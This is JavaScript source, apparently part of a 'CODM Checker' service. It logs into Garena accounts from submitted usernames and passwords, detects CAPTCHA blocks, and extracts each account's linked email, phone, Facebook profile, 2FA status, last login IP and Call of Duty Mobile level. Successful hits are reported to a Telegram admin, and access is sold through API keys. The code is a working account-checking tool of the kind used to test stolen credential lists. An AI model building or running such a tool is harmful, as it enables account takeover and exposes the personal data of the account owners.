        const errorStr = stripAnsiCodes(error.toString());
        const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
            log.warn(`CAPTCHA detected during acc info script request error for ${accountUsername}: ${errorStr}`, 'checkLogin');
            return "[API_ERROR] CAPTCHA Detected (Acc Info Script Request Error)";
        }
        if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
            log.error(`Account info script timed out for ${accountUsername}`, 'checkLogin');
            return "[API_ERROR][Timeout] Account info script timeout";
        }
        log.error(`Account info script request failed for ${accountUsername}: ${error}`, 'checkLogin');
        return `[API_ERROR][Request] Account info script request failed: ${errorStr.slice(0, 100)}`;
    }

    // --- Parse details from the script's JSON response ---
     if (!initJsonResponse || typeof initJsonResponse !== 'object') {
        log.error(`Account info processing failed - response was not a dictionary for ${accountUsername}`, 'checkLogin');
        return "[API_ERROR] Failed to process account info response (Invalid structure)";
    }
    // Check for errors within the JSON response
    // Adjust property names based on actual script output ('success', 'error', 'message')
    if (initJsonResponse.error || initJsonResponse.success === false || initJsonResponse.status === 'error') {
        const errorDetail = initJsonResponse.error || initJsonResponse.message || 'Unknown Error from script';
        const cleanErrorDetail = stripAnsiCodes(String(errorDetail));
        log.warn(`Account info script returned error for ${accountUsername}: ${cleanErrorDetail}`, 'checkLogin');
        if (detectCaptchaInResponse(cleanErrorDetail)) {
            return "[API_ERROR] CAPTCHA Required (Acc Info Script Error Field)";
        }
        return `[API_ERROR] Account info script error: ${cleanErrorDetail.slice(0, 150)}`;
    }

    // --- Extract data (Adjust keys based on *actual* script output) ---
    const bindings = initJsonResponse.bindings || []; // Assuming 'bindings' is like ["key: value", ...]
    const accountStatus = stripAnsiCodes(String(initJsonResponse.status || 'Unknown')); // 'status' might be top-level

    let country = "N/A", lastLogin = "N/A", lastLoginWhere = "N/A", avatarUrl = "N/A";
    let fbName = "N/A", fbLink = "N/A", mobile = "N/A", email = "N/A";
    let facebookBound = "False", emailVerified = "False", authenticatorEnabled = "False", twoStepEnabled = "False";
    let shell = "0", ckzCount = "UNKNOWN", lastLoginIp = "N/A";

    if (Array.isArray(bindings)) {
        bindings.forEach(binding => {
            const bindingClean = stripAnsiCodes(String(binding));
            if (bindingClean.includes(":")) {
                try {
                    let [key, ...valueParts] = bindingClean.split(":");
                    let value = valueParts.join(":").trim(); // Handle values containing colons
                    key = key.trim().toLowerCase();
                    if (!value) return;

                    // Map keys (case-insensitive, adjust based on actual script keys)
                    if (key === "country") country = value;
                    else if (key === "lastlogin" && !key.includes("from") && !key.includes("ip")) lastLogin = value;
                    else if (key === "lastloginfrom") lastLoginWhere = value;
                    else if (key === "lastloginip") lastLoginIp = value;
                    else if (key === "ckz") ckzCount = value;
                    else if (key === "garena shells") {
                        const shellMatch = value.match(/(\d+)/);
                        shell = shellMatch ? shellMatch[1] : "0";
                    } else if (key === "facebook account" && value !== "N/A") { fbName = value; facebookBound = "True"; }
                    else if (key === "fb link") fbLink = value;
                    else if (key === "avatar") avatarUrl = value;
                    else if (key === "mobile number" && value !== "N/A") mobile = value;
                    else if (key === "tae") emailVerified = value.toLowerCase().includes("yes") ? "True" : "False"; // Assuming TAE = Email Verified
                    else if (key === "eta" && value !== "N/A") email = value; // Assuming ETA = Email Address
                    else if (key === "authenticator") authenticatorEnabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                    else if (key === "two-step verification") twoStepEnabled = value.toLowerCase().includes("enabled") ? "True" : "False";

                } catch (parseErr) {
                    log.warn(`Error parsing binding line for ${accountUsername}: '${bindingClean}' - ${parseErr}`, 'checkLogin');
                }
            }
        });
    } else {
        log.warn(`Bindings data from script was not an array for ${accountUsername}: ${JSON.stringify(bindings)}`, 'checkLogin');
    }

    log.info(`Account info parsed successfully for ${accountUsername}. Status: ${accountStatus}, Last Login IP: ${lastLoginIp}`, 'checkLogin');


    // 4. Grant Token Request
    const grantHeaders = {
        ...baseHeaders, // Base UA etc.
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=' + encodeURIComponent(REDIRECT_URL),
        // Host, Connection, Accept-Encoding, Language already in baseHeaders
    };
    const grantData = new URLSearchParams({ // Use URLSearchParams for form encoding
        client_id: "100082",
        response_type: "token",
        redirect_uri: REDIRECT_URL,
        format: "json",
        id: _id // Use the same random ID? Check if necessary
    }).toString();

    // Cookies needed: datadome, sso_key (from login response headers, handled by jar)
    log.debug(`Attempting to grant token for ${accountUsername}`, 'checkLogin');
    const grantConfig = {
        headers: grantHeaders,
        timeout: 30000,
        proxy: proxies ? proxies : false,
        // Cookies handled by jar
    };

    let grantResponse;
    let accessToken;
    try {
        const grantUrl = "https://auth.garena.com/oauth/token/grant";
        grantResponse = await axiosInstance.post(grantUrl, grantData, grantConfig);
        const grantTextClean = stripAnsiCodes(JSON.stringify(grantResponse.data));
        log.debug(`Grant token response status: ${grantResponse.status}, data snippet: ${grantTextClean.slice(0, 200)}`, 'checkLogin');

         if (detectCaptchaInResponse(grantTextClean)) {
            log.warn(`CAPTCHA detected in grant token response body for ${accountUsername}.`, 'checkLogin');
            return "[API_ERROR] CAPTCHA Detected (Grant Token Response Body)";
        }

        const grantJson = grantResponse.data;
        if (!grantJson || typeof grantJson !== 'object') {
            log.error(`Grant token response not a JSON object: ${grantTextClean.slice(0, 200)}`, 'checkLogin');
            return "[API_ERROR] Grant token failed: Non-JSON response";
        }

        if (grantJson.error) {
            const errorMsg = grantJson.error;
            log.warn(`Grant token error field for ${accountUsername}: ${errorMsg}`, 'checkLogin');
            if (detectCaptchaInResponse(errorMsg)) {
                return "[API_ERROR] CAPTCHA Required (Grant Token Error Field)";
            }
            return `[API_ERROR] Grant token failed: ${errorMsg}`;
        }
        if (!grantJson.access_token) {
            log.error(`Grant token response missing access_token for ${accountUsername}: ${JSON.stringify(grantJson)}`, 'checkLogin');
            return "[API_ERROR] Grant token response missing 'access_token'";
        }

        accessToken = grantJson.access_token;
        // Cookies set during grant are handled by the jar
        log.info(`Access token granted for ${accountUsername}.`, 'checkLogin');

    } catch (error) {
        const errorStr = stripAnsiCodes(error.toString());
        const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
            log.warn(`CAPTCHA detected during grant token request error for ${accountUsername}: ${errorStr}`, 'checkLogin');
            return "[API_ERROR] CAPTCHA Detected (Grant Token Request Error)";
        }
         if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
            log.error(`Grant token request timed out for ${accountUsername}`, 'checkLogin');
            return "[API_ERROR][Timeout] Grant token request timed out.";
        }
         if (error.response) {
             const status = error.response.status;
             log.warn(`Grant token HTTP Error ${status} for ${accountUsername}: ${JSON.stringify(error.response.data).slice(0, 200)}`, 'checkLogin');
              // Check body for specific errors if needed
             return `[API_ERROR][HTTP] Grant Token HTTP Error ${status}`;
         }
        log.error(`Grant token request error for ${accountUsername}: ${error}`, 'checkLogin');
        return `[API_ERROR][Request] Grant token request error: ${errorStr.slice(0, 100)}`;
    }

    // 5. Check CODM Level
    log.debug(`Checking CODM level for ${accountUsername}`, 'checkLogin');
    // Pass the same axios instance which holds the necessary cookies (datadome, sso_key, token_session?)
    const codmResultStr = await showLevel(accessToken, baseHeaders, axiosInstance, proxies);
    log.debug(`CODM check result string for ${accountUsername}: ${codmResultStr}`, 'checkLogin');

    if (typeof codmResultStr === 'string' && codmResultStr.startsWith("[")) {
        log.warn(`CODM check failed or warned for ${accountUsername}: ${codmResultStr}`, 'checkLogin');
        return codmResultStr; // Propagate the specific error/warning string
    }

    // 6. Format Final Result
    let codmNickname = "N/A", codmLevelStr = "N/A", codmRegion = "N/A", uid = "N/A";
    let connectedGamesListForJson = [];
    // Check if codmResultStr is the expected format "nick|lvl|region|uid"
    if (typeof codmResultStr === 'string' && codmResultStr.includes("|")) {
        const parts = codmResultStr.split("|");
        if (parts.length === 4) {
             [codmNickname, codmLevelStr, codmRegion, uid] = parts;
             // Basic validation again
             if (/^\d+$/.test(codmLevelStr) && codmNickname && codmRegion && uid && codmNickname !== 'N/A') {
                 log.info(`Successfully parsed CODM details for ${accountUsername}: Nick=${codmNickname}, Lvl=${codmLevelStr}`, 'checkLogin');
                 connectedGamesListForJson.push({
                     game: "CODM", region: codmRegion, level: codmLevelStr,
                     nickname: codmNickname, uid: uid
                 });
             } else {
                 log.warn(`CODM result string parsed but contained invalid data: ${codmResultStr}`, 'checkLogin');
                 return `[CODM_FAIL] Parsed invalid CODM data: ${codmResultStr.slice(0, 100)}`;
             }
        } else {
             log.warn(`CODM result string had pipes but wrong number of parts: ${codmResultStr}`, 'checkLogin');
             return `[CODM_FAIL] Unexpected CODM data format (wrong parts): ${codmResultStr.slice(0, 100)}`;
        }
    } else {
        // If show_level didn't return error string but result isn't the expected format
        log.warn(`CODM check for ${accountUsername} returned unexpected format/type: ${typeof codmResultStr} -> ${String(codmResultStr).slice(0,100)}`, 'checkLogin');
        return `[CODM_FAIL] Unexpected CODM data format: ${String(codmResultStr).slice(0, 100)}`;
    }

    // If we reach here, everything succeeded
    const resultDict = formatResultDict(
        lastLogin, lastLoginWhere, country, shell, avatarUrl, mobile,
        facebookBound, emailVerified, authenticatorEnabled, twoStepEnabled,
        connectedGamesListForJson, fbName, fbLink, email, date,
        accountUsername, password, ckzCount, lastLoginIp, accountStatus
    );
    log.info(`Full check successful for ${accountUsername}. Level: ${codmLevelStr}`, 'checkLogin');
    return resultDict; // Return the success dictionary
}

// Function to format the final successful result into a JSON-friendly object
function formatResultDict(
    lastLogin, lastLoginWhere, country, shellStr, avatarUrl, mobile,
    facebookBoundStr, emailVerifiedStr, authenticatorEnabledStr, twoStepEnabledStr,
    connectedGamesData, fbName, fbLink, email, date,
    username, password, /* OMITTED password */ ckzCount, lastLoginIp, accountStatus
) {
    let codmInfoJson = { status: "Not Linked or Check Failed", level: null };
    if (connectedGamesData && connectedGamesData.length > 0) {
        const gameData = connectedGamesData[0]; // Assume only CODM
        if (gameData.game === "CODM") {
            let levelVal = null;
            try {
                const parsed = parseInt(gameData.level, 10);
                if (!isNaN(parsed)) {
                    levelVal = parsed;
                }
            } catch { /* ignore */ }

            codmInfoJson = {
                status: "Linked",
                game: "CODM",
                region: gameData.region || null,
                level: levelVal,
                nickname: gameData.nickname || null,
                uid: gameData.uid || null
            };
        }
    }

    let shellValue = 0;
    try {
        const parsed = parseInt(shellStr, 10);
        if (!isNaN(parsed)) {
            shellValue = parsed;
        }
    } catch { /* ignore */ }

    const cleanNa = (value) => {
        return (value === "N/A" || value === null || value === undefined || value === "" || String(value).toLowerCase() === "unknown") ? null : value;
    };
    const cleanBoolStr = (value) => value === "True";


    const resultData = {
        // owner: OWNER_TAG, // Added at the API response level
        checker_by: CHECKER_BY_TAG,
        timestamp_utc: new Date().toISOString(),
        check_run_id: date, // Timestamp from start of check
        username: username,
        // password: password, // --- OMITTING PASSWORD FROM RESPONSE FOR SECURITY ---
        account_status: cleanNa(accountStatus),
        account_country: cleanNa(country),
        garena_shells: shellValue,
        avatar_url: cleanNa(avatarUrl),
        last_login_time: cleanNa(lastLogin),
        last_login_location: cleanNa(lastLoginWhere),
        last_login_ip: cleanNa(lastLoginIp),
        bindings: {
            mobile_number: cleanNa(mobile),
            email_address: cleanNa(email),
            facebook_name: cleanNa(fbName),
            facebook_link: cleanNa(fbLink),
        },
        security: {
            mobile_bound: cleanNa(mobile) !== null,
            email_verified: cleanBoolStr(emailVerifiedStr),
            facebook_linked: cleanBoolStr(facebookBoundStr),
            google_authenticator_enabled: cleanBoolStr(authenticatorEnabledStr),
            two_step_verification_enabled: cleanBoolStr(twoStepEnabledStr),
        },
        codm_details: codmInfoJson,
        ckz_count: cleanNa(ckzCount) === "UNKNOWN" ? null : cleanNa(ckzCount),
    };

    // Optional: Deep clean null values (more complex in JS)
    // You might write a recursive helper function if needed, but the above is usually sufficient.

    return resultData;
}


async function performCheck(username, password) {
    log.debug(`Starting perform_check for ${username}`, 'performCheck');
    const date = getCurrentTimestamp();
    const randomId = String(Math.floor(Math.random() * 900000000000) + 100000000000); // 12 digit random ID
    const headers = getRequestData(); // Get fresh headers for this check

    // Create a dedicated axios instance with its own cookie jar for this check
    const jar = new CookieJar();
    const axiosInstance = axios.create({ jar });
    axiosCookieJarSupport(axiosInstance); // Apply cookie jar support


    const preloginParams = new URLSearchParams({
        app_id: '100082',
        account: username,
        format: 'json',
        id: randomId,
    });
    const preloginUrl = `https://auth.garena.com/api/prelogin?${preloginParams.toString()}`;

    // 1. Prelogin Request
    log.debug(`Performing prelogin request for ${username}`, 'performCheck');
    let preloginResponse;
    try {
        preloginResponse = await axiosInstance.get(preloginUrl, { headers: headers, timeout: 20000 }); // Use the instance with jar
        const preloginTextClean = stripAnsiCodes(JSON.stringify(preloginResponse.data));
        log.debug(`Prelogin response status: ${preloginResponse.status}, data snippet: ${preloginTextClean.slice(0, 200)}`, 'performCheck');

        if (detectCaptchaInResponse(preloginTextClean)) {
             log.warn(`CAPTCHA detected in prelogin response for ${username}.`, 'performCheck');
             return "[API_ERROR] CAPTCHA Detected (Prelogin Response)";
        }
         // Cookies from prelogin (like datadome) are now stored in axiosInstance.defaults.jar

    } catch (error) {
        const errorStr = stripAnsiCodes(error.toString());
        const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
            log.warn(`CAPTCHA detected during prelogin request error for ${username}: ${errorStr}`, 'performCheck');
            return "[API_ERROR] CAPTCHA Detected (Prelogin Request Error)";
        }
        if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
            log.error(`Prelogin timed out for ${username}`, 'performCheck');
            return "[API_ERROR][Timeout] Prelogin Timed Out";
        }
        if (error.response) {
            const status = error.response.status;
             const respData = error.response.data;
            log.warn(`Prelogin HTTP Error ${status} for ${username}: ${JSON.stringify(respData).slice(0, 200)}`, 'performCheck');
            if (status === 403) return `[API_ERROR] Prelogin Forbidden (403)`;
            if (status === 429) return "[API_ERROR][RateLimit] Prelogin Rate Limited (429)";
             // Check error message in body for specific Garena prelogin errors
             if (respData && typeof respData === 'object' && respData.error) {
                 const garenaError = respData.error;
                 if (garenaError === 'error_account_does_not_exist') {
                     return "[LOGIN_FAIL] Account doesn't exist"; // Treat as login fail
                 }
                  // Add other known prelogin errors if they indicate definitive failure
                 return `[API_ERROR] Prelogin Error: ${garenaError}`;
             }
            return `[API_ERROR][HTTP] Prelogin HTTP ${status}`;
        }
        log.error(`Prelogin request failed for ${username}: ${error}`, 'performCheck');
        return `[API_ERROR][Request] Prelogin Request Failed: ${errorStr.slice(0, 100)}`;
    }

    // 2. Parse Prelogin Response Data
    const data = preloginResponse.data;
     if (!data || typeof data !== 'object') {
        log.error(`Invalid Prelogin JSON (not object) for ${username}: ${JSON.stringify(data).slice(0, 200)}`, 'performCheck');
        return `[API_ERROR] Invalid Prelogin JSON`;
    }
     // Check error field again even if status was 2xx
     if (data.error) {
        const errorMsg = data.error;
        log.warn(`Prelogin error field for ${username}: ${errorMsg}`, 'performCheck');
        if (detectCaptchaInResponse(errorMsg)) {
            return "[API_ERROR] CAPTCHA Required (Prelogin Error Field)";
        }
        if (errorMsg === 'error_account_does_not_exist') {
            return "[LOGIN_FAIL] Account doesn't exist";
        }
        return `[API_ERROR] Prelogin Error: ${errorMsg}`;
    }

    const v1 = data.v1;
    const v2 = data.v2;
    if (!v1 || !v2) {
        log.error(`Prelogin data missing v1/v2 for ${username}: ${JSON.stringify(data)}`, 'performCheck');
        return "[API_ERROR] Prelogin Data Missing (v1/v2)";
    }

    // Datadome cookie from prelogin response headers is now in the jar, no need to pass explicitly


    // 3. Encrypt Password & Call check_login
    let encryptedPassword;
    try {
        encryptedPassword = getEncryptedPassword(password, v1, v2);
    } catch (encError) {
         log.error(`Failed to encrypt password for ${username}: ${encError}`, 'performCheck');
         return "[API_ERROR] Password encryption failed";
    }


    // Call the main login/check logic using the same axios instance and headers
    const loginResult = await checkLogin(
        username,
        randomId,
        encryptedPassword,
        password, // Pass original password for formatting (but don't return in API)
        headers, // Pass the base headers
        axiosInstance, // Pass the axios instance with the cookie jar
        date,
        null // No proxy by default
    );

    return loginResult; // Return the dict or error string from check_login

}


// --- Express Application ---
const app = express();
// Configure 'trust proxy' if running behind a reverse proxy (like Nginx, Heroku)
// to get the correct req.ip
app.set('trust proxy', 1); // Adjust the number based on your proxy setup

app.get('/api', async (req, res) => {
    // Reload keys on each request for simplicity and to reflect bot changes
    await loadApiKeys();

    const { apikey, username, password } = req.query;
    const clientIp = req.ip;

    log.info(`Request received from ${clientIp}: user=${username || 'N/A'}, key_provided=${apikey ? 'Yes' : 'No'}`, '/codm');

    // Validate API Key
    if (!apikey || !apiKeys.has(apikey)) {
        log.warn(`Invalid API key attempt from ${clientIp}. Key: ${apikey || 'None'}`, '/codm');
        return res.status(401).json({ status: "error", owner: OWNER_TAG, message: "Invalid or missing API key" });
    }

    // Validate Input Parameters
    if (!username || !password) {
        log.warn(`Missing username or password from ${clientIp} (Key: ${apikey})`, '/codm');
        return res.status(400).json({ status: "error", owner: OWNER_TAG, message: "Missing username or password parameter" });
    }

    // Perform the actual check
    try {
        const result = await performCheck(username, password);

        if (typeof result === 'object' && result !== null && !result.error) {
            // --- Successful check ---
            log.info(`Check successful for ${username} (Key: ${apikey}). Level: ${result?.codm_details?.level ?? 'N/A'}`, '/codm');

            // --- FORWARD SUCCESS TO TELEGRAM ADMIN (Non-blocking) ---
            if (bot && TELEGRAM_ADMIN_USER_ID) {
                // Escape username for MarkdownV2 (simple backticks are usually safe)
                const escapedUsername = `\`${username.replace(/`/g, "'")}\``; // Basic protection
                const codmNick = result?.codm_details?.nickname;
                const codmLevel = result?.codm_details?.level;
                let codmInfoStr = "N/A";
                if (codmNick && codmLevel) {
                    // Escape nick for MarkdownV2 (more complex chars might need full escaping)
                    const escapedNick = he.encode(codmNick).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
                    codmInfoStr = `${escapedNick} \\(Lvl ${codmLevel}\\)`;
                } else if (codmNick) {
                     const escapedNick = he.encode(codmNick).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
                     codmInfoStr = `${escapedNick} (Lvl N/A)`;
                } else if (result?.codm_details?.status === 'Linked') {
                    codmInfoStr = "Linked (Details N/A)";
                }

                const successMsg = `✅ Check success for user: ${escapedUsername}\nCODM: ${codmInfoStr}`;

                bot.sendMessage(TELEGRAM_ADMIN_USER_ID, successMsg, { parse_mode: 'MarkdownV2' })
                    .catch(err => {
                        log.warn(`Failed to forward success message to admin ${TELEGRAM_ADMIN_USER_ID}: ${err.message || err}`, '/codm');
                    });
            } else {
                if (!bot) log.warn("Telegram bot instance not available for forwarding success.", '/codm');
                if (!TELEGRAM_ADMIN_USER_ID) log.warn("Telegram Admin User ID not configured for forwarding success.", '/codm');
            }
            // --- END TELEGRAM FORWARD ---

            return res.status(200).json({ status: "success", owner: OWNER_TAG, data: result });

        } else if (typeof result === 'string') {
            // Handle known error strings
            log.warn(`Check failed for ${username} (Key: ${apikey}): ${result}`, '/codm');
            let status_code = 500; // Default internal error
            let message = "Check failed";
            let detail = result;

             // Extract detail cleanly
            if (result.includes("]")) {
                 detail = result.split("]", 1)[1]?.trim() || result;
            }

            if (result.startsWith("[API_ERROR]")) {
                message = "Checker API error";
                if (result.includes("CAPTCHA")) status_code = 429; // Too Many Requests / CAPTCHA
                else if (result.includes("Timeout")) status_code = 504; // Gateway Timeout
                else if (result.includes("RateLimit")) status_code = 429;
                else if (result.includes("Connection")) status_code = 503; // Service Unavailable
                else status_code = 500; // Internal Server Error / Dependency Issue
            } else if (result.startsWith("[LOGIN_FAIL]")) {
                message = "Login failed";
                status_code = 403; // Forbidden (Invalid Credentials / Account Issue)
            } else if (result.startsWith("[CODM_FAIL]") || result.startsWith("[CODM_WARN]")) {
                message = "CODM check failed post-login";
                 if (result.startsWith("[CODM_WARN]")) message = "CODM check warning";
                status_code = 502; // Bad Gateway (Issue with CODM check/script after login)
            }

            return res.status(status_code).json({ status: "error", owner: OWNER_TAG, message: message, detail: detail });
        } else {
            // Unexpected result type
            log.error(`Unexpected result type from perform_check for ${username}: ${typeof result}`, '/codm');
            return res.status(500).json({ status: "error", owner: OWNER_TAG, message: "Internal server error (unexpected result type)" });
        }

    } catch (error) {
        log.error(`Critical error processing request for ${username} (Key: ${apikey}): ${error.stack || error}`, '/codm');
        return res.status(500).json({ status: "error", owner: OWNER_TAG, message: "Internal server error", detail: stripAnsiCodes(String(error)) });
    }
});

app.get('/', (req, res) => {
     res.status(200).json({
         status: "ok",
         message: "S1N CODM Checker API is running.",
         owner: OWNER_TAG
        });
});

// --- Telegram Bot Functions ---

function setupTelegramBot() {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" || !TELEGRAM_ADMIN_USER_ID) {
        log.warn("Telegram Bot Token or Admin User ID not set correctly in .env. Bot will not run.", 'TelegramBot');
        return null;
    }

    try {
        bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
        log.info("Telegram bot initialized and polling.", 'TelegramBot');

        // --- Authorization Middleware ---
        const authorized = (msg, reply = true) => {
            const userId = msg.from?.id;
            if (userId !== TELEGRAM_ADMIN_USER_ID) {
                if (reply) bot.sendMessage(msg.chat.id, "⛔ You are not authorized to use this command.");
                log.warn(`Unauthorized Telegram access attempt by user ${userId} (${msg.from?.username || 'N/A'})`, 'TelegramBot');
                return false;
            }
            return true;
        };

        // --- Command Handlers ---
        bot.onText(/\/start$/, (msg) => {
            if (!authorized(msg)) return;
            bot.sendMessage(msg.chat.id,
                `👋 Hello Admin\\! \\(${OWNER_TAG}\\)\n\n` + // Escaped ! and added owner
                `Use /addkey \`<key>\` to add an API key\\.\n` +
                `Use /removekey \`<key>\` to remove an API key\\.\n` +
                `Use /listkeys to view current keys\\.\n`+
                `Use /reloadkeys to force reload from file\\.`,
                 { parse_mode: "MarkdownV2" }
            );
        });

        bot.onText(/\/addkey (.+)/, async (msg, match) => {
            if (!authorized(msg)) return;
            const newKey = match[1].trim();
            if (!newKey) {
                bot.sendMessage(msg.chat.id, "⚠️ API key cannot be empty.");
                return;
            }
            if (/\s/.test(newKey)) {
                 bot.sendMessage(msg.chat.id, "⚠️ API key cannot contain spaces.");
                 return;
             }

            await loadApiKeys(); // Ensure latest keys are loaded
            if (apiKeys.has(newKey)) {
                // Escape key for MarkdownV2 before sending
                 const escapedKey = he.encode(newKey).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
                bot.sendMessage(msg.chat.id, `ℹ️ API key \`${escapedKey}\` already exists\\.`, { parse_mode: "MarkdownV2" });
            } else {
                apiKeys.add(newKey); // Add to the set in memory
                const saved = await saveApiKeys(); // Attempt to save to file
                if (saved) {
                     const escapedKey = he.encode(newKey).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
                    bot.sendMessage(msg.chat.id, `✅ API key \`${escapedKey}\` added successfully\\.`, { parse_mode: "MarkdownV2" });
                    log.info(`API key '${newKey}' added by admin ${msg.from.id} via Telegram.`, 'TelegramBot');
                } else {
                    apiKeys.delete(newKey); // Rollback memory change if save failed
                    bot.sendMessage(msg.chat.id, "❌ Failed to save API keys to file. Check logs. Key not added.");
                }
            }
        });

        bot.onText(/\/removekey (.+)/, async (msg, match) => {
            if (!authorized(msg)) return;
            const keyToRemove = match[1].trim();

            await loadApiKeys(); // Ensure latest keys are loaded
            if (!apiKeys.has(keyToRemove)) {
                const escapedKey = he.encode(keyToRemove).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
                bot.sendMessage(msg.chat.id, `ℹ️ API key \`${escapedKey}\` not found\\.`, { parse_mode: "MarkdownV2" });
            } else {
                apiKeys.delete(keyToRemove); // Remove from memory
                const saved = await saveApiKeys(); // Attempt save
                if (saved) {
                    const escapedKey = he.encode(keyToRemove).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
                    bot.sendMessage(msg.chat.id, `✅ API key \`${escapedKey}\` removed successfully\\.`, { parse_mode: "MarkdownV2" });
                    log.info(`API key '${keyToRemove}' removed by admin ${msg.from.id} via Telegram.`, 'TelegramBot');
                } else {
                    apiKeys.add(keyToRemove); // Rollback memory change if save failed
                    bot.sendMessage(msg.chat.id, "❌ Failed to save API keys to file. Check logs. Key not removed.");
                }
            }
        });

        bot.onText(/\/listkeys$/, async (msg) => {
            if (!authorized(msg)) return;
            await loadApiKeys(); // Ensure latest keys
            if (apiKeys.size === 0) {
                bot.sendMessage(msg.chat.id, "ℹ️ No API keys found.");
            } else {
                // Escape keys for MarkdownV2
                 const keysList = Array.from(apiKeys).sort().map(key =>
                     "`" + he.encode(key).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&') + "`" // Escape MarkdownV2 special chars
                 ).join("\n");
                bot.sendMessage(msg.chat.id, `🔑 Current API Keys (${apiKeys.size}):\n${keysList}`, { parse_mode: 'MarkdownV2' });
            }
        });

         bot.onText(/\/reloadkeys$/, async (msg) => {
             if (!authorized(msg)) return;
             await loadApiKeys();
             bot.sendMessage(msg.chat.id, `✅ Reloaded ${apiKeys.size} keys from file\\.`, { parse_mode: 'MarkdownV2' });
         });

        // Optional: Catch-all for unknown commands for the admin
        bot.on('message', (msg) => {
            // Ignore if it's a known command or not from admin
            if (msg.text && msg.text.startsWith('/') && !['/start', '/addkey', '/removekey', '/listkeys', '/reloadkeys'].some(cmd => msg.text.startsWith(cmd))) {
                if (authorized(msg, false)) { // Authorize but don't send the default "not authorized" reply
                     bot.sendMessage(msg.chat.id, "❓ Sorry, I didn't understand that command\\. Use /start to see available commands\\.", { parse_mode: 'MarkdownV2' });
                }
            }
        });

        // Error handling for the bot itself
        bot.on('polling_error', (error) => {
            log.error(`Telegram Polling Error: ${error.code} - ${error.message}`, 'TelegramBot');
            // Optionally, try to restart polling after a delay, or notify admin if possible
            // Be careful not to create an error loop
        });
        bot.on('webhook_error', (error) => {
             log.error(`Telegram Webhook Error: ${error.code} - ${error.message}`, 'TelegramBot');
         });

        return bot;

    } catch (error) {
        log.error(`Failed to initialize Telegram bot: ${error}`, 'TelegramBot');
        return null;
    }
}


// --- Main Execution ---
(async () => {
    log.info(`--- API Checker Script Started (PID: ${process.pid}) ---`);
    log.info(`--- Owner: ${OWNER_TAG} ---`);
    await loadApiKeys(); // Initial load of keys

    // Start Telegram bot
    setupTelegramBot(); // Starts polling internally if configured

    // Start Express app
    const host = process.env.HOST || '0.0.0.0'; // Use HOST env var if set, otherwise default
    const port = parseInt(process.env.PORT || '5000', 10); // Use PORT env var if set, otherwise default

    app.listen(port, host, () => {
        log.info(`Express application listening on http://${host}:${port}`);
    });

})();

// Graceful shutdown handler
async function gracefulShutdown(signal) {
    log.info(`${signal} received. Shutting down gracefully...`);
    // Add any cleanup tasks here (e.g., closing DB connections)
    if (bot) {
        log.info("Stopping Telegram bot polling...");
        // Add a timeout to stopPolling in case it hangs
        const stopPollingTimeout = setTimeout(() => {
            log.warn("Telegram bot stopPolling timed out. Forcing exit.");
            process.exit(1); // Exit with error code if timeout
        }, 5000); // 5 second timeout

        try {
            await bot.stopPolling({ cancel: true }); // Request cancellation of pending updates
             clearTimeout(stopPollingTimeout);
            log.info("Telegram bot polling stopped.");
        } catch (err) {
             clearTimeout(stopPollingTimeout);
             log.error(`Error stopping bot polling: ${err}`, 'Shutdown');
             process.exitCode = 1; // Indicate error on exit
        }
    }
    log.info(`--- API Checker Script Stopping (Owner: ${OWNER_TAG}) ---`);
    process.exit(process.exitCode || 0); // Exit with stored code or 0
}

process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
